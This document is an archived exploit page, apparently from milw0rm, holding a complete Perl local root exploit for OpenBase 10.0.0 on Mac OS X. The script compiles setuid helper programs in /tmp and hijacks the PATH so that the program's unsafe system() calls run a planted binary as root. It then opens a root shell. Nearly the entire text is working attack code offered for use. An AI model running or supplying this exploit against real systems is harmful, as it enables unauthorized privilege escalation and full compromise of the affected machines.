<html><head><title>Xcode OpenBase <= 10.0.0 (unsafe system call) Local Root Exploit (OSX)</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# &lt;= ftp://www.openbase.com/pub/OpenBase_10.0 (vulnerable) ?
#
# This is some fairly blatant and retarded use of system()
#
# cd cp chmod chown rm mkdir and killall appear as strings in the binary hrmm can you cay system() !
# -restart -MachLaunch -launch -noexit -install_plugins -kill -install -uninstall and -deactivate all
# *may* be used to trigger these issues.
#
# I don't feel like seeing which flags call which binaries... just 3 is plenty to prove the point.
#
# Tested against OpenBase10.0.0_MacOSX.dmg

$binpath = &quot;/Library/OpenBase/bin/openexec&quot;; # Typical location.

$tgts{&quot;0&quot;} = &quot;cp:$binpath -install&quot;;
$tgts{&quot;1&quot;} = &quot;killall:$binpath -kill&quot;;
$tgts{&quot;2&quot;} = &quot;rm:$binpath -uninstall&quot;;

unless (($target) = @ARGV) {
       print &quot;\n\nUsage: $0 &lt;target&gt; \n\nTargets:\n\n&quot;;

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{&quot;$key&quot;});
               print &quot;\t$key . $a - $b\n&quot;;
       }

       print &quot;\n&quot;;
       exit 1;
}

$ret = pack(&quot;l&quot;, ($retval));
($a,$b) = split(/\:/,$tgts{&quot;$target&quot;});
print &quot;*** Target: $a - $b\n&quot;;

open(OP,&quot;&gt;/tmp/finisterre.c&quot;);
printf OP &quot;main()\n&quot;;
printf OP &quot;{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\&quot;chown root: /tmp/pwns ; chmod 4775 /tmp/pwns\&quot;); }\n&quot;;

open(OP,&quot;&gt;/tmp/pwns.c&quot;);
printf OP &quot;main()\n&quot;;
printf OP &quot;{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\&quot;/bin/sh -i\&quot;); }\n&quot;;

system(&quot;gcc -o /tmp/finisterre /tmp/finisterre.c&quot;);
system(&quot;gcc -o /tmp/pwns /tmp/pwns.c&quot;);

system(&quot;echo /bin/cp /tmp/finisterre /tmp/$a&quot;);
system(&quot;/bin/cp /tmp/finisterre /tmp/$a&quot;);

system(&quot;export PATH=/tmp:\$PATH; $b&quot;);
system(&quot;/tmp/pwns&quot;);

# milw0rm.com [2006-11-08]</pre></html>